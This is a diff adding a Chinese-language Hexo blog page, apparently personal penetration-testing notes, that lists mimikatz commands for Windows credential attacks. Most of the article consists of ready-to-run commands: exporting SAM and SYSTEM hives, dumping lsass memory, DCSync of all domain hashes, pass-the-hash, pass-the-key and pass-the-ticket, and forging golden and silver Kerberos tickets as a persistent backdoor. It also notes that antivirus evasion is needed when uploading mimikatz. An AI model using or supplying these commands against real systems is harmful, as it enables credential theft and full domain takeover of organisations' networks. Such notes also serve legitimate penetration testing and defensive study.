@@ -1,0 +1,529 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
+  <link rel="icon" type="image/png" href="/img/favicon.png">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#4a4770">
+  <meta name="description" content="">
+  <meta name="author" content="">
+  <meta name="keywords" content="">
+  <title>mimikatz中哈希与票据操作 | Cheekkk&#39;s Anti-Gravity Galaxy</title>
+
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/css/bootstrap.min.css" />
+<link  rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/highlight.js/10.0.0/styles/atelier-forest-light.min.css" />
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_fmb4a04yx8h.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_pjno9b9zyxs.css">
+
+
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+<meta name="generator" content="Hexo 4.2.0"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>Cheekkk's Anti-Gravity Galaxy</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/">
+              <i class="iconfont icon-home-fill"></i>
+              首页</a>
+          </li>
+        
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/tags/">
+              <i class="iconfont icon-tags-fill"></i>
+              标签</a>
+          </li>
+        
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/about/">
+              <i class="iconfont icon-user-fill"></i>
+              关于</a>
+          </li>
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="view intro-2" id="background" parallax=true
+         style="background: url('/img/bg.jpg') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="container text-center white-text fadeInUp">
+            <span class="h2" id="subtitle">
+              
+            </span>
+
+            
+              
+
+              <div class="mt-1">
+                
+                  
+                  <span class="post-meta mr-2">
+                    <i class="iconfont icon-chart"></i>
+                    1.6k 字
+                  </span>
+                
+
+                
+                  
+                  <span class="post-meta mr-2">
+                      <i class="iconfont icon-clock-fill"></i>
+                    
+                    
+                    9
+                     分钟
+                  </span>
+                
+
+                
+              </div>
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid">
+  <div class="row">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-md">
+      <div class="container nopadding-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <div class="post-content mx-auto" id="post">
+            
+            <article class="markdown-body">
+              <p>记录一下获取哈希及票据相关的操作命令</p>
+<a id="more"></a>
+
+<h1 id="mimikatz中哈希与票据操作"><a href="#mimikatz中哈希与票据操作" class="headerlink" title="mimikatz中哈希与票据操作"></a>mimikatz中哈希与票据操作</h1><h2 id="00-导出SAM和System读取"><a href="#00-导出SAM和System读取" class="headerlink" title="00 导出SAM和System读取"></a>00 导出SAM和System读取</h2><p>SAM文件位置：C:\Windows\System32\config</p>
+<p>导出文件：</p>
+<pre><code class="hljs q">reg <span class="hljs-built_in">save</span> hklm\sam sam.hive         <span class="hljs-comment">//导出SAM</span>
+ref <span class="hljs-built_in">save</span> hklm\<span class="hljs-built_in">system</span> <span class="hljs-built_in">system</span>.hive   <span class="hljs-comment">//导出system</span></code></pre>
+
+<p>读取SAM和System获取hash：<br>pwdump7:</p>
+<pre><code class="hljs xml">pwdump7.exe -s <span class="hljs-tag">&lt;<span class="hljs-name">samfile\</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">systemfile\</span>&gt;</span></code></pre>
+<p>mimikatz:</p>
+<pre><code class="hljs groovy"><span class="hljs-string">lsadump:</span>:sam <span class="hljs-regexp">/sam:sam.hive /</span><span class="hljs-string">system:</span>system.hive <span class="hljs-comment">//使用mimikatz读取</span></code></pre>
+<p>注意：<br>需要将sam.hive和system.hive放到本地mimikatz目录下</p>
+<h2 id="01-读取本地SAM"><a href="#01-读取本地SAM" class="headerlink" title="01 读取本地SAM"></a>01 读取本地SAM</h2><pre><code class="hljs cpp">privilege::debug <span class="hljs-comment">//提升至debug权限</span>
+token::elevate   <span class="hljs-comment">//提升至system权限</span>
+lsadump::sam     <span class="hljs-comment">//读取SAM文件获取hash</span></code></pre>
+<p>注意：<br>此方法需要在目标机器上运行mimikatz，需要考虑上传和免杀</p>
+<h2 id="02-读取在线SAM"><a href="#02-读取在线SAM" class="headerlink" title="02 读取在线SAM"></a>02 读取在线SAM</h2><pre><code class="hljs cpp">privilege::debug         <span class="hljs-comment">//提升至debug权限</span>
+sekurlsa::logonpasswords <span class="hljs-comment">//获取hash及其他用户信息</span></code></pre>
+<p>注意：<br>要在mimikatz目录下打开命令行执行命令</p>
+<h2 id="03-读取lsass-dmp"><a href="#03-读取lsass-dmp" class="headerlink" title="03 读取lsass.dmp"></a>03 读取lsass.dmp</h2><p>可以使用procdump导出lsass.dmp文件</p>
+<pre><code class="hljs css"><span class="hljs-selector-tag">Procdump</span><span class="hljs-selector-class">.exe</span> <span class="hljs-selector-tag">-acceptula</span> <span class="hljs-selector-tag">-ma</span> <span class="hljs-selector-tag">lsass</span><span class="hljs-selector-class">.exe</span> <span class="hljs-selector-tag">lsass</span><span class="hljs-selector-class">.dmp</span></code></pre>
+<p>使用mimikatz读取：</p>
+<pre><code class="hljs lasso">sekurlsa<span class="hljs-type">::minidump</span> lsass.dmp   <span class="hljs-comment">//加载dmp文件</span>
+sekurlsa<span class="hljs-type">::logonPasswords</span> <span class="hljs-literal">full</span>  <span class="hljs-comment">//导出散列值</span></code></pre>
+
+<h2 id="04-dcsync获取Hash"><a href="#04-dcsync获取Hash" class="headerlink" title="04 dcsync获取Hash"></a>04 dcsync获取Hash</h2><pre><code class="hljs groovy"><span class="hljs-string">lsadump:</span>:dcsync <span class="hljs-regexp">/domain:要获取的domain /</span>all <span class="hljs-regexp">/csv   /</span>/导出域中所有用户名及hash
+<span class="hljs-string">lsadump:</span>:dcsync <span class="hljs-regexp">/domain:目标域 /</span><span class="hljs-string">user:</span>目标用户</code></pre>
+<p>注意：<br>可以在域中任意一台计算机执行，但要使用域管权限打开命令行环境</p>
+<h2 id="05-在域控中获取Hash"><a href="#05-在域控中获取Hash" class="headerlink" title="05 在域控中获取Hash"></a>05 在域控中获取Hash</h2><pre><code class="hljs cpp">privilege::debug         <span class="hljs-comment">//提升至debug权限</span>
+<span class="hljs-built_in">log</span>                      <span class="hljs-comment">//先生成一个文本文件记录，防止内容太多无法显示</span>
+lsadump::lsa /inject     <span class="hljs-comment">//导出域内所有账号和Hash</span></code></pre>
+
+<h2 id="06-哈希传递"><a href="#06-哈希传递" class="headerlink" title="06 哈希传递"></a>06 哈希传递</h2><p>获取hash：</p>
+<pre><code class="hljs cpp">privilege::debug         <span class="hljs-comment">//提升至debug权限</span>
+sekurlsa::logonpasswords <span class="hljs-comment">//获取hash及其他用户信息</span></code></pre>
+<p>注入hash：</p>
+<pre><code class="hljs less"><span class="hljs-attribute">privilege</span>::debug                                               <span class="hljs-comment">//提升至debug权限</span>
+<span class="hljs-attribute">sekurlsa</span>::pth /<span class="hljs-attribute">user</span>:目标用户名 /<span class="hljs-attribute">domain</span>:目标域 /<span class="hljs-attribute">ntlm</span>:获取的hash    <span class="hljs-comment">//注入hash</span></code></pre>
+<p>成功后自动弹出一个新的shell<br>注意：<br>dir命令后面要使用主机名，不能用IP，否则报错<br>使用mimikatz进行哈希传递要具有本地管理员权限</p>
+<h2 id="07-密钥传递"><a href="#07-密钥传递" class="headerlink" title="07 密钥传递"></a>07 密钥传递</h2><p>获取aes256密钥：</p>
+<pre><code class="hljs cpp">privilege::debug         <span class="hljs-comment">//提升至debug权限</span>
+sekurlsa::ekeys          <span class="hljs-comment">//获取密钥及其他用户信息</span></code></pre>
+<p>传递密钥：</p>
+<pre><code class="hljs less"><span class="hljs-attribute">privilege</span>::debug                                               <span class="hljs-comment">//提升至debug权限</span>
+<span class="hljs-attribute">sekurlsa</span>::pth /<span class="hljs-attribute">user</span>:目标用户名 /<span class="hljs-attribute">domain</span>:目标域 /<span class="hljs-attribute">aes256</span>:获取的密钥   <span class="hljs-comment">//注入密钥</span></code></pre>
+<p>注意：<br>dir命令后面要使用主机名，不能用IP，否则报错<br>使用mimikatz进行哈希传递要具有本地管理员权限<br>aes128密钥也可以进行传递<br>目标机器需要安装KB2871997<br>如果安装了KB28711997，仍可以使用SID为500的用户进行哈希传递</p>
+<h2 id="08-票据传递"><a href="#08-票据传递" class="headerlink" title="08 票据传递"></a>08 票据传递</h2><p>ptc方法：</p>
+<pre><code class="hljs cpp">kerberos::purge         <span class="hljs-comment">//清空当前机器中所有凭证，如果有域成员凭证会影响凭证伪造</span>
+kerberos::<span class="hljs-built_in">list</span>          <span class="hljs-comment">//查看当前机器凭证</span>
+kerberos::ptc 票据文件   <span class="hljs-comment">//将票据注入到内存中</span>
+klist                   <span class="hljs-comment">//查看是否注入成功</span></code></pre>
+<p>ptt方法：</p>
+<pre><code class="hljs cpp">privilege::debug           <span class="hljs-comment">//提升至debug权限</span>
+sekurlsa::tickets /exports <span class="hljs-comment">//将内存中的票据导出至当前目录</span>
+kerberos::purge            <span class="hljs-comment">//清空当前机器中所有凭证，如果有域成员凭证会影响凭证伪造</span>
+kerberos::ptt <span class="hljs-string">"票据路径"</span>    <span class="hljs-comment">//将票据注入内存</span>
+klist                      <span class="hljs-comment">//查看是否注入成功</span></code></pre>
+<p>注意：<br>dir命令后面要使用主机名，不能用IP，否则报错<br>票据注入内存默认有效时间10个小时<br>在目标机器上不需要本地管理员权限就可以进行票据传递</p>
+<h2 id="09-黄金票据"><a href="#09-黄金票据" class="headerlink" title="09 黄金票据"></a>09 黄金票据</h2><p>利用krbtgt的HASH值可以伪造生成任意的TGT(mimikatz)，能够绕过对任意用户的账号策略，让用户成为任意组的成员，可用于Kerberos认证的任何服务。</p>
+<ul>
+<li>需要的信息：</li>
+<li>要伪造的域管理员用户名</li>
+<li>完整的域名</li>
+<li>域SID</li>
+<li>krbtgt的NTLM Hash<br>在域控中进行操作：<pre><code class="hljs cpp">privilege::debug         <span class="hljs-comment">//提升至debug权限</span>
+lsadump::lsa /patch      <span class="hljs-comment">// 专用于在域控制器上导出用户密码或hash</span></code></pre>
+在普通用户主机进行操作：<pre><code class="hljs groovy"><span class="hljs-string">kerberos:</span>:golden <span class="hljs-regexp">/user:需要伪造的域管理员用户名 /</span><span class="hljs-string">domain:</span>demo.com <span class="hljs-regexp">/sid:域sid /</span><span class="hljs-string">krbtgt:</span> krbtgt用户的Hash <span class="hljs-regexp">/ticket:ticket.kirbi       /</span>/伪造凭证
+<span class="hljs-string">kerberos:</span>:ptt &lt;票据文件&gt;   <span class="hljs-comment">//注入</span>
+<span class="hljs-string">kerberos:</span>:tgt             <span class="hljs-comment">//查看当前票据</span></code></pre>
+之后即可在普通用户主机上使用net use进行登录，伪造的黄金票据可以看做一个后门</li>
+</ul>
+<h2 id="10-白银票据"><a href="#10-白银票据" class="headerlink" title="10 白银票据"></a>10 白银票据</h2><p>白银票据的利用过程是伪造TGS，通过已知的授权服务密码生成一张可以访问该服务的TGT。因为在票据生成过程中不需要使用KDC<br>白银票据依赖于服务账号的密码散列值，这不同于黄金票据利用需要使用krbtgt账号的密码哈希值<br>需要的信息：</p>
+<ul>
+<li><p>域名</p>
+</li>
+<li><p>域SID</p>
+</li>
+<li><p>目标服务器的FQDN</p>
+</li>
+<li><p>可利用的服务</p>
+</li>
+<li><p>服务账号的NTLM Hash</p>
+</li>
+<li><p>要伪造的用户名<br>在域控中的操作：</p>
+<pre><code class="hljs cpp">privilege::debug         <span class="hljs-comment">//提升至debug权限</span>
+sekurlsa::logonpasswords <span class="hljs-comment">//获取hash及其他用户信息</span></code></pre>
+<p>在普通用户主机的操作：</p>
+<pre><code class="hljs groovy"><span class="hljs-string">kerberos:</span>:golden <span class="hljs-regexp">/domain:域名 /</span><span class="hljs-string">sid:</span>域SID值 <span class="hljs-regexp">/target:域控名 /</span><span class="hljs-string">rc4:</span>域控的NTLM hash <span class="hljs-regexp">/service:可利用的服务，如cifs /</span><span class="hljs-string">user:</span>要伪造的用户名，可任意填写 /ptt</code></pre>
+<p>常用的服务名有以下:</p>
+<pre><code class="hljs routeros">服务名称                    同时需要的服务
+WMI                        HOST、RPCSS
+PowerShell Remoting        HOST、HTTP
+WinRM                    HOST、HTTP
+Scheduled Tasks            HOST
+Windows File Share        CIFS
+LDAP                    LDAP
+Windows Remote<span class="hljs-built_in"> Server </span>   RPCSS、LDAP、CIFS</code></pre>
+<p>黄金票据与白银票据的区别：</p>
+</li>
+<li><p>访问权限不同</p>
+<ul>
+<li>黄金票据:伪造TGT,可以获取任何Kerberos服务权限</li>
+<li>白银票据:伪造TGS,只能访问指定的服务</li>
+</ul>
+</li>
+<li><p>加密方式不同</p>
+</li>
+<li><p>黄金票据:由Kerberos的Hash—&gt; krbtgt加密</p>
+</li>
+<li><p>白银票据:由服务器端密码的Hash值—&gt; master key 加密</p>
+</li>
+<li><p>认证流程不同</p>
+</li>
+<li><p>黄金票据:利用过程需要访问域控(KDC)</p>
+</li>
+<li><p>白银票据:可以直接跳过 KDC 直接访问对应的服务器</p>
+</li>
+</ul>
+<p>参考：</p>
+<p><a href="https://wh0ale.github.io/2018/12/25/2018-12-25-域渗透之票据/" target="_blank" rel="noopener">https://wh0ale.github.io/2018/12/25/2018-12-25-%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B9%8B%E7%A5%A8%E6%8D%AE/</a></p>
+<p>[<a href="https://www.k0rz3n.com/2019/03/17/%E6%B5%85%E6%9E%90%20Kerberos%20%E8%AE%A4%E8%AF%81%E8%BF%87%E7%A8%8B%E4%BB%A5%E5%8F%8A%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE%E5%92%8C%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AE/]" target="_blank" rel="noopener">https://www.k0rz3n.com/2019/03/17/%E6%B5%85%E6%9E%90%20Kerberos%20%E8%AE%A4%E8%AF%81%E8%BF%87%E7%A8%8B%E4%BB%A5%E5%8F%8A%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE%E5%92%8C%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AE/]</a>(<a href="https://www.k0rz3n.com/2019/03/17/浅析" target="_blank" rel="noopener">https://www.k0rz3n.com/2019/03/17/浅析</a> Kerberos 认证过程以及黄金票据和白银票据/)</p>
+<p><a href="https://www.freebuf.com/articles/network/245872.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/network/245872.html</a></p>
+
+            </article>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">内网渗透</a>
+                    
+                      <a class="hover-with-bg" href="/tags/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/">工具使用</a>
+                    
+                  </div>
+                
+              </div>
+              
+                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a href="https://zh.wikipedia.org/wiki/Wikipedia:CC_BY-SA_3.0%E5%8D%8F%E8%AE%AE%E6%96%87%E6%9C%AC" target="_blank" rel="nofollow noopener noopener">CC BY-SA 3.0协议</a> 。转载请注明出处！</p>
+              
+              
+                <div class="post-prevnext row">
+                  <div class="post-prev col-6">
+                    
+                    
+                  </div>
+                  <div class="post-next col-6">
+                    
+                    
+                      <a href="/wordpress%E4%B8%ADxmlrpc%E7%9A%84%E5%88%A9%E7%94%A8/">
+                        <span class="hidden-mobile">wordpress中xmlrpc的利用</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </div>
+                </div>
+              
+            </div>
+
+            
+          </div>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div id="tocbot"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+  </main>
+
+  
+    <a id="scroll-top-button" href="#" role="button">
+      <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+    </a>
+  
+
+  
+    <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+  
+
+  
+
+  
+
+  <footer class="mt-5">
+  <div class="text-center py-3">
+    <div>
+      <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a>
+      <i class="iconfont icon-love"></i>
+      <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener">
+        <span>Fluid</span></a>
+    </div>
+    
+
+    
+
+    
+  </div>
+</footer>
+
+<!-- SCRIPTS -->
+<script  src="https://cdn.staticfile.org/jquery/3.4.1/jquery.min.js" ></script>
+<script  src="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/js/bootstrap.min.js" ></script>
+<script  src="/js/main.js" ></script>
+
+
+  <script  src="/js/lazyload.js" ></script>
+
+
+
+  
+  <script  src="https://cdn.staticfile.org/tocbot/4.11.1/tocbot.min.js" ></script>
+  <script>
+    $(document).ready(function () {
+      var boardCtn = $('#board-ctn');
+      var boardTop = boardCtn.offset().top;
+
+      tocbot.init({
+        tocSelector: '#tocbot',
+        contentSelector: '.post-content',
+        headingSelector: 'h1,h2,h3,h4,h5,h6',
+        linkClass: 'tocbot-link',
+        activeLinkClass: 'tocbot-active-link',
+        listClass: 'tocbot-list',
+        isCollapsedClass: 'tocbot-is-collapsed',
+        collapsibleClass: 'tocbot-is-collapsible',
+        collapseDepth: 1,
+        scrollSmooth: true,
+        headingsOffset: -boardTop
+      });
+      if ($('.toc-list-item').length > 0) {
+        $('#toc').css('visibility', 'visible');
+      }
+    });
+  </script>
+
+
+
+
+
+  <script defer src="https://cdn.staticfile.org/clipboard.js/2.0.6/clipboard.min.js" ></script>
+  <script  src="/js/clipboard-use.js" ></script>
+
+
+
+
+
+
+<!-- Plugins -->
+
+
+
+  <script  src="https://cdn.staticfile.org/typed.js/2.0.11/typed.min.js" ></script>
+  <script>
+    var typed = new Typed('#subtitle', {
+      strings: [
+        '  ',
+        "mimikatz中哈希与票据操作&nbsp;",
+      ],
+      cursorChar: "_",
+      typeSpeed: 40,
+      loop: false,
+    });
+    typed.stop();
+    $(document).ready(function () {
+      $(".typed-cursor").addClass("h2");
+      typed.start();
+    });
+  </script>
+
+
+
+  <script  src="https://cdn.staticfile.org/anchor-js/4.2.2/anchor.min.js" ></script>
+  <script>
+    anchors.options = {
+      placement: "right",
+      visible: "hover",
+      
+    };
+    var el = "h1,h2,h3,h4,h5,h6".split(",");
+    var res = [];
+    for (item of el) {
+      res.push(".markdown-body > " + item)
+    }
+    anchors.add(res.join(", "))
+  </script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+  <script>
+    var path = "/local-search.xml";
+    var inputArea = document.querySelector("#local-search-input");
+    inputArea.onclick = function () {
+      searchFunc(path, 'local-search-input', 'local-search-result');
+      this.onclick = null
+    }
+  </script>
+
+
+
+  <script  src="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+  <script>
+    $('#post img:not(.no-zoom img, img[no-zoom]), img[zoom]').each(
+      function () {
+        var element = document.createElement('a');
+        $(element).attr('data-fancybox', 'images');
+        $(element).attr('href', $(this).attr('src'));
+        $(this).wrap(element);
+      }
+    );
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/assets/hibiki.model.json"},"display":{"position":"right","width":200,"height":400,"hOffset":0,"vOffset":-20},"mobile":{"show":true,"scale":0.5},"react":{"opacityDefault":0.7,"opacityOnHover":0.2},"log":false});</script></body>
+</html>
